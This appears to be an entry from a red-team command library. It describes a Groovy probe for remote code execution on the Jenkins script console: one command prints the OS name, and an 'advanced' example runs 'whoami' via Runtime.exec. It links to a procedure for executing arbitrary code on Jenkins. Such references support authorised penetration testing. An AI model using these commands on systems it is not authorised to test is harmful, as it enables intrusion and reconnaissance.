---
data: println System.getProperty("os.name")
tags:
  - rce
  - groovy
type: command
executor: groovy
platforms:
  - Jenkins
id: 7ad45b31-56e4-4d67-9e7f-8fa2e278a035
created_at: '2025-12-11T03:47:56.615Z'
updated_at: '2025-12-11T03:47:56.615Z'
verified: false
validated: true
submitted: true
---
# groovy-rce-test

## Command

```groovy
println System.getProperty("os.name")
```

## Description

This Groovy script tests for remote code execution by retrieving the operating system name from system properties.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | No parameters | N/A |

## Examples

### Basic Usage

```groovy
println System.getProperty("os.name")
```

### Advanced Usage

```groovy
Runtime.getRuntime().exec("whoami")
```

## Expected Output

The name of the operating system, e.g., 'Linux' or 'Windows NT'.

## Related

- [[procedures/Execute-Arbitrary-Code-via-Jenkins-Script-Console]]
